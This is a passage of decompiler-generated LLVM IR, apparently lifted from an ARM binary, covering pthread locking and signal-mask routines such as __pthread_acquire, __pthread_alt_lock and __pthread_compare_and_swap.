  %v4_1e714 = inttoptr i32 %v3_1e714 to i32*
  %v5_1e714 = load i32, i32* %v4_1e714, align 4
  store i32 %v5_1e714, i32* %r1.global-to-local, align 4
  %v7_1e718 = icmp eq i32 %arg1, 1
  store i32 %v2_1e714, i32* %stack_var_-32, align 4
  br i1 %v7_1e718, label %dec_label_pc_1e77c, label %dec_label_pc_1e728

dec_label_pc_1e728:                               ; preds = %dec_label_pc_1e714
  %v7_1e728 = icmp eq i32 %arg1, 2
  br i1 %v7_1e728, label %dec_label_pc_1e73c, label %dec_label_pc_1e730

dec_label_pc_1e730:                               ; preds = %dec_label_pc_1e728
  %v2_1e730 = icmp eq i32 %arg1, 0
  br i1 %v2_1e730, label %dec_label_pc_1e750, label %dec_label_pc_1e790

dec_label_pc_1e73c:                               ; preds = %dec_label_pc_1e728
  %v4_1e740 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 256) to i32*), align 4
  store i32 %v2_1e704, i32* @r0, align 4
  %v1_1e748 = inttoptr i32 %v4_1e740 to i32*
  %v2_1e748 = load i32, i32* %v1_1e748, align 4
  store i32 %v2_1e748, i32* %r1.global-to-local, align 4
  %v2_1e74c = call i32 @__GI_sigaddset(i32 %v2_1e704, i32 %v2_1e748)
  %v0_1e754.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1e750

dec_label_pc_1e750:                               ; preds = %dec_label_pc_1e730, %dec_label_pc_1e73c
  %v0_1e754 = phi i32 [ ptrtoint (i32* @global_var_44990.1184 to i32), %dec_label_pc_1e730 ], [ %v0_1e754.pre, %dec_label_pc_1e73c ]
  %v2_1e754 = add i32 %v0_1e754, 252
  %v3_1e754 = inttoptr i32 %v2_1e754 to i32*
  %v4_1e754 = load i32, i32* %v3_1e754, align 4
  store i32 %v2_1e704, i32* @r0, align 4
  %v1_1e75c = inttoptr i32 %v4_1e754 to i32*
  %v2_1e75c = load i32, i32* %v1_1e75c, align 4
  store i32 %v2_1e75c, i32* %r1.global-to-local, align 4
  %v1_1e760 = call i32 @__GI_sigdelset(i32 %v2_1e704)
  %v0_1e768 = load i32, i32* %r4.global-to-local, align 4
  %v2_1e768 = add i32 %v0_1e768, 72
  %v3_1e768 = inttoptr i32 %v2_1e768 to i32*
  %v4_1e768 = load i32, i32* %v3_1e768, align 4
  %v1_1e76c = inttoptr i32 %v4_1e768 to i32*
  %v2_1e76c = load i32, i32* %v1_1e76c, align 4
  store i32 %v2_1e76c, i32* %r1.global-to-local, align 4
  %tmp15 = icmp slt i32 %v2_1e76c, 1
  br i1 %tmp15, label %dec_label_pc_1e790, label %dec_label_pc_1e788

dec_label_pc_1e77c:                               ; preds = %dec_label_pc_1e714
  %v4_1e780 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 256) to i32*), align 4
  %v1_1e784 = inttoptr i32 %v4_1e780 to i32*
  %v2_1e784 = load i32, i32* %v1_1e784, align 4
  store i32 %v2_1e784, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1e788

dec_label_pc_1e788:                               ; preds = %dec_label_pc_1e750, %dec_label_pc_1e77c
  store i32 %v2_1e704, i32* @r0, align 4
  %v1_1e78c = call i32 @__GI_sigdelset(i32 %v2_1e704)
  br label %dec_label_pc_1e790

dec_label_pc_1e790:                               ; preds = %dec_label_pc_1e730, %dec_label_pc_1e750, %dec_label_pc_1e788
  store i32 %v2_1e704, i32* %r1.global-to-local, align 4
  %v0_1e794.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1e798.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1e794

dec_label_pc_1e794:                               ; preds = %entry, %dec_label_pc_1e790
  %v1_1e79c = phi i32 [ 0, %entry ], [ %v2_1e704, %dec_label_pc_1e790 ]
  %v0_1e798 = phi i32 [ %arg3, %entry ], [ %v0_1e798.pre, %dec_label_pc_1e790 ]
  %v0_1e794 = phi i32 [ %arg1, %entry ], [ %v0_1e794.pre, %dec_label_pc_1e790 ]
  %v3_1e79c = call i32 @__GI_sigprocmask(i32 %v0_1e794, i32 %v1_1e79c, i32 %v0_1e798)
  %v3_1e7a0 = icmp eq i32 %v3_1e79c, -1
  %v8_1e7a0 = icmp eq i32 %v3_1e79c, -1
  br i1 %v8_1e7a0, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_1e794
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1e794, %bb
  %v1_1e7bc6 = phi i32 [ %v3_1e79c, %dec_label_pc_1e794 ], [ 0, %bb ]
  br i1 %v3_1e7a0, label %dec_label_pc_1e7ac, label %dec_label_pc_1e7b4

dec_label_pc_1e7ac:                               ; preds = %bb16
  %v0_1e7ac = call i32 @__errno_location()
  %v1_1e7b0 = inttoptr i32 %v0_1e7ac to i32*
  %v2_1e7b0 = load i32, i32* %v1_1e7b0, align 4
  br label %dec_label_pc_1e7b4

dec_label_pc_1e7b4:                               ; preds = %bb16, %dec_label_pc_1e7ac
  %v1_1e7bc = phi i32 [ %v1_1e7bc6, %bb16 ], [ %v2_1e7b0, %dec_label_pc_1e7ac ]
  ret i32 %v1_1e7bc

; uselistorder directives
  uselistorder i32 %v3_1e79c, { 1, 0, 2 }
  uselistorder i32 %v2_1e704, { 0, 5, 7, 6, 2, 1, 4, 3 }
  uselistorder i32 %v0_1e6fc, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder label %dec_label_pc_1e7b4, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1e794, { 1, 0 }
  uselistorder label %dec_label_pc_1e790, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e788, { 1, 0 }
  uselistorder label %dec_label_pc_1e750, { 1, 0 }
}

define i32 @function_1e7c4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1e7c4:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1e7c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e7c4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1e7c4
  %v5_1e7c4 = mul i32 %tmp, 4
  %v6_1e7c4 = and i32 %v5_1e7c4, %tmp
  %v4_1e7c8 = inttoptr i32 %v6_1e7c4 to i32*
  store i32 %v6_1e7c4, i32* %v4_1e7c8, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1e7c4, %bb
  %v4_1e7cc = phi i32 [ %tmp, %dec_label_pc_1e7c4 ], [ 0, %bb ]
  ret i32 %v4_1e7cc

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_1e7d0 = load i32, i32* @r4, align 4
  %v6_1e7d0 = load i32, i32* @r5, align 4
  %v12_1e7d0 = load i32, i32* @r7, align 4
  %v2_1e7d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 1, i32* @r7, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  br label %dec_label_pc_1e7f4

dec_label_pc_1e7f4:                               ; preds = %dec_label_pc_1e814thread-pre-split.dec_label_pc_1e7f4_crit_edge, %entry
  %v0_1e7f8 = phi i32 [ 0, %entry ], [ %v0_1e7f4.pre, %dec_label_pc_1e814thread-pre-split.dec_label_pc_1e7f4_crit_edge ]
  %v2_1e808 = phi i32 [ 0, %entry ], [ %v0_1e824, %dec_label_pc_1e814thread-pre-split.dec_label_pc_1e7f4_crit_edge ]
  %v1_1e7f8 = add i32 %v0_1e7f8, 1
  store i32 %v1_1e7f8, i32* @r4, align 4
  %v8_1e7fc = icmp sgt i32 %v0_1e7f8, 49
  br i1 %v8_1e7fc, label %dec_label_pc_1e808, label %dec_label_pc_1e800

dec_label_pc_1e800:                               ; preds = %dec_label_pc_1e7f4
  %v2_1e800 = call i32 @sched_yield(i32 %v2_1e7d8, i32 %v2_1e808)
  %v0_1e824.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e814thread-pre-split

dec_label_pc_1e808:                               ; preds = %dec_label_pc_1e7f4
  store i32 %v2_1e808, i32* %stack_var_-40, align 4
  %v1_1e80c = call i32 @nanosleep(i32 %v2_1e7d8)
  %v0_1e810 = load i32, i32* @r5, align 4
  store i32 %v0_1e810, i32* @r4, align 4
  br label %dec_label_pc_1e814thread-pre-split

dec_label_pc_1e814thread-pre-split:               ; preds = %dec_label_pc_1e808, %dec_label_pc_1e800
  %v0_1e824 = phi i32 [ %v0_1e810, %dec_label_pc_1e808 ], [ %v0_1e824.pre, %dec_label_pc_1e800 ]
  %v0_1e814.pr = load i32, i32* @r7, align 4
  %v2_1e81c = icmp eq i32 %v0_1e814.pr, 0
  store i32 %v0_1e824, i32* @r1, align 4
  br i1 %v2_1e81c, label %dec_label_pc_1e82c, label %dec_label_pc_1e814thread-pre-split.dec_label_pc_1e7f4_crit_edge

dec_label_pc_1e814thread-pre-split.dec_label_pc_1e7f4_crit_edge: ; preds = %dec_label_pc_1e814thread-pre-split
  %v0_1e7f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1e7f4

dec_label_pc_1e82c:                               ; preds = %dec_label_pc_1e814thread-pre-split
  store i32 %v3_1e7d0, i32* @r4, align 4
  store i32 %v6_1e7d0, i32* @r5, align 4
  store i32 %v12_1e7d0, i32* @r7, align 4
  ret i32 %v2_1e7d8

; uselistorder directives
  uselistorder i32 %v0_1e7f8, { 1, 0 }
  uselistorder i32 %v2_1e7d8, { 2, 1, 0 }
  uselistorder i32 49, { 7, 0, 1, 2, 3, 4, 5, 6 }
}

define i32 @wait_node_free() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1e83c = load i32, i32* @r4, align 4
  store i32 %v3_1e83c, i32* %stack_var_-16, align 4
  %v6_1e83c = load i32, i32* @r5, align 4
  %v9_1e83c = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_9704.1317 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v0_1e84c = load i32, i32* @r0, align 4
  store i32 %v0_1e84c, i32* @r6, align 4
  %v1_1e854 = call i32 @__pthread_acquire(i32 add (i32 ptrtoint (i32* @global_var_9704.1317 to i32), i32 ptrtoint (i32* @global_var_44990.1184 to i32)))
  %v0_1e85c = load i32, i32* @r4, align 4
  %v2_1e85c = add i32 %v0_1e85c, 38656
  %v3_1e85c = inttoptr i32 %v2_1e85c to i32*
  %v4_1e85c = load i32, i32* %v3_1e85c, align 4
  store i32 %v4_1e85c, i32* %r2.global-to-local, align 4
  %v0_1e860 = load i32, i32* @r6, align 4
  store i32 %v0_1e860, i32* %v3_1e85c, align 4
  %v0_1e864 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e864 = load i32, i32* @r6, align 4
  %v2_1e864 = inttoptr i32 %v1_1e864 to i32*
  store i32 %v0_1e864, i32* %v2_1e864, align 4
  %v1_1e86c = load i32, i32* @r4, align 4
  %v2_1e86c = load i32, i32* @r5, align 4
  %v3_1e86c = add i32 %v2_1e86c, %v1_1e86c
  %v4_1e86c = inttoptr i32 %v3_1e86c to i32*
  store i32 0, i32* %v4_1e86c, align 4
  %v2_1e870 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e870, i32* @r4, align 4
  store i32 %v6_1e83c, i32* @r5, align 4
  store i32 %v9_1e83c, i32* @r6, align 4
  ret i32 %v1_1e854
}

define i32 @__pthread_lock() local_unnamed_addr {
entry:
  %v0_1e884 = load i32, i32* @r0, align 4
  %v1_1e884 = add i32 %v0_1e884, 4
  %v1_1e888 = call i32 @__pthread_acquire(i32 %v1_1e884)
  ret i32 %v1_1e888
}

define i32 @_thread_self.2() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_1e890 = load i32, i32* @lr, align 4
  store i32 %v0_1e890, i32* %stack_var_-4, align 4
  %v4_1e89c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_1e8a0 = inttoptr i32 %v4_1e89c to i32*
  %v2_1e8a0 = load i32, i32* %v1_1e8a0, align 4
  %v2_1e8a4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_1e8a8 = icmp ult i32 %v2_1e8a4, %v2_1e8a0
  br i1 %v3_1e8a8, label %dec_label_pc_1e8b8, label %dec_label_pc_1e8e4

dec_label_pc_1e8b8:                               ; preds = %entry
  %v4_1e8bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_1e8c0 = inttoptr i32 %v4_1e8bc to i32*
  %v2_1e8c0 = load i32, i32* %v1_1e8c0, align 4
  %v3_1e8c4 = icmp ult i32 %v2_1e8a4, %v2_1e8c0
  br i1 %v3_1e8c4, label %dec_label_pc_1e8ec, label %dec_label_pc_1e8cc

dec_label_pc_1e8cc:                               ; preds = %dec_label_pc_1e8b8
  %v4_1e8d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_1e8d4 = inttoptr i32 %v4_1e8d0 to i32*
  %v2_1e8d4 = load i32, i32* %v1_1e8d4, align 4
  %v3_1e8d8 = icmp ult i32 %v2_1e8a4, %v2_1e8d4
  br i1 %v3_1e8d8, label %dec_label_pc_1e8e4, label %dec_label_pc_1e8ec

dec_label_pc_1e8e4:                               ; preds = %dec_label_pc_1e8cc, %entry
  %v1_1e8e4 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_1e8cc ]
  %v3_1e8e4 = inttoptr i32 %v1_1e8e4 to i32*
  %v4_1e8e4 = load i32, i32* %v3_1e8e4, align 4
  br label %dec_label_pc_1e918

dec_label_pc_1e8ec:                               ; preds = %dec_label_pc_1e8cc, %dec_label_pc_1e8b8
  %v4_1e8f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_1e8f4 = inttoptr i32 %v4_1e8f0 to i32*
  %v2_1e8f4 = load i32, i32* %v1_1e8f4, align 4
  %v2_1e8f8 = icmp eq i32 %v2_1e8f4, 0
  br i1 %v2_1e8f8, label %dec_label_pc_1e908, label %dec_label_pc_1e900

dec_label_pc_1e900:                               ; preds = %dec_label_pc_1e8ec
  %v0_1e900 = call i32 @__pthread_find_self()
  %v2_1e91c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1e918

dec_label_pc_1e908:                               ; preds = %dec_label_pc_1e8ec
  %v3_1e908 = and i32 %v2_1e8a4, -2097152
  %v4_1e908 = xor i32 %v3_1e908, -2097152
  %v1_1e914 = sub i32 -352, %v4_1e908
  br label %dec_label_pc_1e918

dec_label_pc_1e918:                               ; preds = %dec_label_pc_1e900, %dec_label_pc_1e8e4, %dec_label_pc_1e908
  %v1_1e920 = phi i32 [ %v0_1e900, %dec_label_pc_1e900 ], [ %v4_1e8e4, %dec_label_pc_1e8e4 ], [ %v1_1e914, %dec_label_pc_1e908 ]
  %v2_1e91c = phi i32 [ %v2_1e91c.pre, %dec_label_pc_1e900 ], [ %v0_1e890, %dec_label_pc_1e8e4 ], [ %v0_1e890, %dec_label_pc_1e908 ]
  store i32 %v2_1e91c, i32* @lr, align 4
  ret i32 %v1_1e920

; uselistorder directives
  uselistorder label %dec_label_pc_1e918, { 2, 0, 1 }
}

define i32 @function_1e928(i16* %arg1) local_unnamed_addr {
dec_label_pc_1e928:
  %v0_1e928 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e928, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_1e928
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_1e928
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @_suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1e948 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_1e948
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %tmp, i32* @r4, align 4
  %v1_1e964 = add i32 %tmp, 4
  store i32 %v1_1e964, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_1e96c = call i32 @__pthread_acquire(i32 %v1_1e964)
  store i32 %v1_1e96c, i32* %r0.global-to-local, align 4
  %v0_1e970 = load i32, i32* @r4, align 4
  %v1_1e970 = inttoptr i32 %v0_1e970 to i32*
  %v2_1e970 = load i32, i32* %v1_1e970, align 4
  store i32 %v2_1e970, i32* %r5.global-to-local, align 4
  %v2_1e974 = icmp eq i32 %v2_1e970, 0
  br i1 %v2_1e974, label %.thread1, label %dec_label_pc_1e988

.thread1:                                         ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_1e970, align 4
  br label %dec_label_pc_1e9b4

dec_label_pc_1e988:                               ; preds = %entry
  %v0_1e988 = load i32, i32* @r6, align 4
  %v2_1e988 = icmp eq i32 %v0_1e988, 0
  br i1 %v2_1e988, label %dec_label_pc_1e990, label %dec_label_pc_1e998

dec_label_pc_1e990:                               ; preds = %dec_label_pc_1e988
  %v0_1e990 = call i32 @_thread_self.2()
  store i32 %v0_1e990, i32* %r0.global-to-local, align 4
  store i32 %v0_1e990, i32* @r6, align 4
  %v0_1e9a4.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1e9a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1e998

dec_label_pc_1e998:                               ; preds = %dec_label_pc_1e988, %dec_label_pc_1e990
  %v1_1e9a8 = phi i32 [ %v0_1e970, %dec_label_pc_1e988 ], [ %v1_1e9a8.pre, %dec_label_pc_1e990 ]
  %v0_1e9a4 = phi i32 [ %v2_1e970, %dec_label_pc_1e988 ], [ %v0_1e9a4.pre, %dec_label_pc_1e990 ]
  %v2_1e9a0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1e9a0, i32* %r3.global-to-local, align 4
  store i32 %v0_1e9a4, i32* %stack_var_-28, align 4
  %v2_1e9a8 = inttoptr i32 %v1_1e9a8 to i32*
  store i32 %v2_1e9a0, i32* %v2_1e9a8, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e9b4

dec_label_pc_1e9b4:                               ; preds = %.thread1, %dec_label_pc_1e998
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1e9b8 = load i32, i32* @r4, align 4
  %v2_1e9b8 = add i32 %v1_1e9b8, 4
  %v3_1e9b8 = inttoptr i32 %v2_1e9b8 to i32*
  store i32 0, i32* %v3_1e9b8, align 4
  %v0_1e9bc = load i32, i32* %r2.global-to-local, align 4
  %v1_1e9bc = load i32, i32* %r3.global-to-local, align 4
  %v9_1e9bc = icmp eq i32 %v0_1e9bc, %v1_1e9bc
  br i1 %v9_1e9bc, label %bb12, label %bb

bb:                                               ; preds = %dec_label_pc_1e9b4
  %v1_1e9c0 = load i32, i32* @r6, align 4
  store i32 %v1_1e9c0, i32* %r0.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1e9b4, %bb
  %v1_1e9c4 = xor i1 %v9_1e9bc, true
  call void @__pseudo_cond_branch(i1 %v1_1e9c4, i32 ptrtoint (i32* @global_var_1e940.1326 to i32))
  %v1_1e9d0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1e9d0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 2, 5, 3, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_1e9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1e998, { 1, 0 }
}

define i32 @__pthread_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1e9d8 = add i32 %arg1, 4
  %v3_1e9d8 = inttoptr i32 %v2_1e9d8 to i32*
  store i32 0, i32* %v3_1e9d8, align 4
  %v0_1e9dc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1e9dc
}

define i32 @__pthread_compare_and_swap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_1ea00 = call i32 @__pthread_acquire(i32 %arg4)
  store i32 %v1_1ea00, i32* %r0.global-to-local, align 4
  %v0_1ea04 = load i32, i32* @r6, align 4
  %v1_1ea04 = inttoptr i32 %v0_1ea04 to i32*
  %v2_1ea04 = load i32, i32* %v1_1ea04, align 4
  %v1_1ea08 = load i32, i32* @r4, align 4
  %v9_1ea08 = icmp eq i32 %v2_1ea04, %v1_1ea08
  br i1 %v9_1ea08, label %bb10, label %.thread1

bb10:                                             ; preds = %entry
  %v1_1ea102 = load i32, i32* @r7, align 4
  store i32 %v1_1ea102, i32* %v1_1ea04, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb10
  %storemerge = phi i32 [ 1, %bb10 ], [ 0, %entry ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1ea1c = load i32, i32* @r5, align 4
  %v2_1ea1c = inttoptr i32 %v1_1ea1c to i32*
  store i32 0, i32* %v2_1ea1c, align 4
  %v1_1ea28 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1ea28

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v1_1ea38 = add i32 %tmp, 4
  %v1_1ea3c = call i32 @__pthread_acquire(i32 %v1_1ea38)
  store i32 -2147483648, i32* @sl, align 4
  %v0_1ea44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1ea44

dec_label_pc_1ea44:                               ; preds = %dec_label_pc_1eabc, %dec_label_pc_1eac4, %entry
  %v0_1ea58 = phi i32 [ %v0_1ea44.pre, %entry ], [ %v0_1ea4415, %dec_label_pc_1eac4 ], [ %v0_1ea4415, %dec_label_pc_1eabc ]
  %v1_1ea44 = inttoptr i32 %v0_1ea58 to i32*
  %v2_1ea44 = load i32, i32* %v1_1ea44, align 4
  store i32 %v2_1ea44, i32* @r0, align 4
  %tmp38 = or i32 %v2_1ea44, 1
  %tmp39 = icmp eq i32 %tmp38, 1
  br i1 %tmp39, label %dec_label_pc_1eae4, label %dec_label_pc_1ea6c.preheader

dec_label_pc_1ea6c.preheader:                     ; preds = %dec_label_pc_1ea44
  store i32 %v0_1ea58, i32* @r5, align 4
  store i32 %v2_1ea44, i32* @r7, align 4
  %v0_1ea64 = load i32, i32* @sl, align 4
  store i32 %v0_1ea64, i32* @r6, align 4
  br label %dec_label_pc_1ea6c

dec_label_pc_1ea6c:                               ; preds = %dec_label_pc_1ea6c.preheader, %dec_label_pc_1ea90.backedge
  %v6_1eaa02 = phi i32 [ %v1_1ea7c20, %dec_label_pc_1ea90.backedge ], [ %v0_1ea58, %dec_label_pc_1ea6c.preheader ]
  %v0_1ea4416 = phi i32 [ %v0_1ea4415, %dec_label_pc_1ea90.backedge ], [ %v0_1ea58, %dec_label_pc_1ea6c.preheader ]
  %v0_1eaa84 = phi i32 [ %v0_1eab4.be, %dec_label_pc_1ea90.backedge ], [ %v2_1ea44, %dec_label_pc_1ea6c.preheader ]
  %v1_1ea6c = add i32 %v0_1eaa84, 8
  %v2_1ea6c = inttoptr i32 %v1_1ea6c to i32*
  %v3_1ea6c = load i32, i32* %v2_1ea6c, align 4
  %v2_1ea70 = icmp eq i32 %v3_1ea6c, 0
  br i1 %v2_1ea70, label %dec_label_pc_1ea94, label %dec_label_pc_1ea78

dec_label_pc_1ea78:                               ; preds = %dec_label_pc_1ea6c
  %v1_1ea78 = inttoptr i32 %v0_1eaa84 to i32*
  %v2_1ea78 = load i32, i32* %v1_1ea78, align 4
  %v2_1ea7c = inttoptr i32 %v6_1eaa02 to i32*
  store i32 %v2_1ea78, i32* %v2_1ea7c, align 4
  %v0_1ea80 = call i32 @wait_node_free()
  %v0_1ea84 = load i32, i32* @r5, align 4
  %v1_1ea84 = load i32, i32* @r4, align 4
  %v1_1ea88 = inttoptr i32 %v0_1ea84 to i32*
  %v2_1ea88 = load i32, i32* %v1_1ea88, align 4
  store i32 %v2_1ea88, i32* @r0, align 4
  br label %dec_label_pc_1ea90.backedge

dec_label_pc_1ea94:                               ; preds = %dec_label_pc_1ea6c
  %v1_1ea94 = add i32 %v0_1eaa84, 4
  %v2_1ea94 = inttoptr i32 %v1_1ea94 to i32*
  %v3_1ea94 = load i32, i32* %v2_1ea94, align 4
  %v1_1ea98 = add i32 %v3_1ea94, 24
  %v2_1ea98 = inttoptr i32 %v1_1ea98 to i32*
  %v3_1ea98 = load i32, i32* %v2_1ea98, align 4
  %v1_1ea9c = load i32, i32* @r6, align 4
  %v5_1eaa0 = icmp slt i32 %v3_1ea98, %v1_1ea9c
  br i1 %v5_1eaa0, label %.thread3, label %bb

.thread3:                                         ; preds = %dec_label_pc_1ea94
  store i32 %v0_1eaa84, i32* @r5, align 4
  %v1_1eaac5 = inttoptr i32 %v0_1eaa84 to i32*
  %v2_1eaac6 = load i32, i32* %v1_1eaac5, align 4
  store i32 %v2_1eaac6, i32* @r0, align 4
  br label %dec_label_pc_1ea90.backedge

bb:                                               ; preds = %dec_label_pc_1ea94
  store i32 %v0_1eaa84, i32* @r7, align 4
  store i32 %v0_1eaa84, i32* @r5, align 4
  %v1_1eaac = inttoptr i32 %v0_1eaa84 to i32*
  %v2_1eaac = load i32, i32* %v1_1eaac, align 4
  store i32 %v2_1eaac, i32* @r0, align 4
  store i32 %v3_1ea98, i32* @r6, align 4
  br label %dec_label_pc_1ea90.backedge

dec_label_pc_1ea90.backedge:                      ; preds = %bb, %dec_label_pc_1ea78, %.thread3
  %v1_1ea7c20 = phi i32 [ %v0_1eaa84, %.thread3 ], [ %v0_1ea84, %dec_label_pc_1ea78 ], [ %v0_1eaa84, %bb ]
  %v0_1ea4415 = phi i32 [ %v0_1ea4416, %.thread3 ], [ %v1_1ea84, %dec_label_pc_1ea78 ], [ %v0_1ea4416, %bb ]
  %v0_1eab4.be = phi i32 [ %v2_1eaac6, %.thread3 ], [ %v2_1ea88, %dec_label_pc_1ea78 ], [ %v2_1eaac, %bb ]
  %v7_1eab4 = icmp eq i32 %v0_1eab4.be, 1
  br i1 %v7_1eab4, label %dec_label_pc_1eabc, label %dec_label_pc_1ea6c

dec_label_pc_1eabc:                               ; preds = %dec_label_pc_1ea90.backedge
  %v0_1eabc.pre = load i32, i32* @r6, align 4
  %v6_1eabc = icmp eq i32 %v0_1eabc.pre, -2147483648
  br i1 %v6_1eabc, label %dec_label_pc_1ea44, label %dec_label_pc_1eac4

dec_label_pc_1eac4:                               ; preds = %dec_label_pc_1eabc
  br label %dec_label_pc_1ea44

dec_label_pc_1eae4:                               ; preds = %dec_label_pc_1ea44
  store i32 0, i32* %v1_1ea44, align 4
  %v1_1eae8.pre = load i32, i32* @r4, align 4
  %phitmp = add i32 %v1_1eae8.pre, 4
  %phitmp24 = inttoptr i32 %phitmp to i32*
  store i32 0, i32* %phitmp24, align 4
  %v1_1eaf4 = load i32, i32* @r0, align 4
  ret i32 %v1_1eaf4

; uselistorder directives
  uselistorder i32 %v0_1eab4.be, { 1, 0 }
  uselistorder i32 %v0_1ea4415, { 1, 0, 2 }
  uselistorder i32 %v0_1ea84, { 1, 0 }
  uselistorder i32 %v0_1eaa84, { 6, 2, 4, 5, 3, 1, 0, 7, 8, 9 }
  uselistorder i32 %v2_1ea44, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1ea58, { 3, 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_1ea90.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ea6c, { 1, 0 }
  uselistorder label %dec_label_pc_1ea44, { 1, 0, 2 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r5, align 4
